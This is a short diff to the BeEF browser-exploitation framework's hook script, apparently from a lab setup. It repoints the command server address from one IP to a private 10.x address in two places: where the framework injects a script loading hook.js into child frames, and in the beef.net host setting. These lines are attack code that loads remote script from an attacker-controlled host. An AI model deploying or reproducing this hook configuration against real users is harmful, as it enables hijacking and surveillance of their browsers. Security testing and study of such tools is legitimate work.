@@ -8938,7 +8938,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://70.94.227.89:80/hook.js';
+        script.src = 'http://10.10.185.222:80/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11713,7 +11713,7 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "70.94.227.89",
+    host: "10.10.185.222",
     port: "80",
     hook: "/hook.js",
     httpproto: "http",
